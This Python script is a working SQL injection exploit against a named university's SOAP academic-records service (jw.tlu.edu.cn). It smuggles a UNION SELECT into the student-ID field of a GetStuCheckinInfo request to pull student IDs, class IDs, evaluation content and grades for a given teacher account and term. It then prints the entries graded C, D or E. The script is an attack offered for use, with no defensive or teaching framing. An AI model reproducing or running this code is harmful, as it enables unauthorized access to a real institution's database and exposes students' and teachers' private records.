from requests import post as post
while(1):
    print("please enter your teacher account:")
    jszgh=input()
    print("please enter the school term(for example:201820191):")
    xn=input()
    headers = {'Content-Type': 'text/xml; charset=utf-8',
    'Content-Length': 'length',
    'SOAPAction': '"http://www.zf_webservice.com/GetStuCheckinInfo "'}
    payload='<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:tns="http://tempuri.org/" xmlns:types="http://tempuri.org/encodedTypes" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body soap:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><q1:GetStuCheckinInfo xmlns:q1="http://www.zf_webservice.com/GetStuCheckinInfo"><xh xsi:type=\'xsd:string\'>222222\' union select Null,xh,xkkh,dj,pjnr,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from xspfb_'+xn+' where jszgh=\''+jszgh+'</xh><xnxq xsi:type="xsd:string">2017-2018-1</xnxq><strKey xsi:type="xsd:string">KKKGZ2312</strKey></q1:GetStuCheckinInfo></soap:Body></soap:Envelope>'
    #print(payload)
    jw = post(url='http://jw.tlu.edu.cn/service.asmx',headers=headers,data=payload)
    #jw.encoding = 'utf-8'
    #print(jw.url)
    print(jw.text)
    raw=jw.text
    data=raw.split('<xh xsi:type="xsd:string">')
    for each in data:
        if each[0]!='<':
            #print(each)
            if each[101]=='C':
                print('Student ID:'+each[0:10])
                print('Class ID:'+each[41:70])
                print('Content:'+each[133:199].split('A')[0])
                print('Grade:'+each[101])

            if each[101]=='D':
                print('Student ID:'+each[0:10])
                print('Class ID:'+each[41:70])
                print('Content:' + each[133:199].split('A')[0])
                print('Grade:'+each[101])
            if each[101]=='E':
                print('Student ID:'+each[0:10])
                print('Class ID:'+each[41:70])
                print('Content:' + each[133:199].split('A')[0])
                print('Grade:'+each[101])


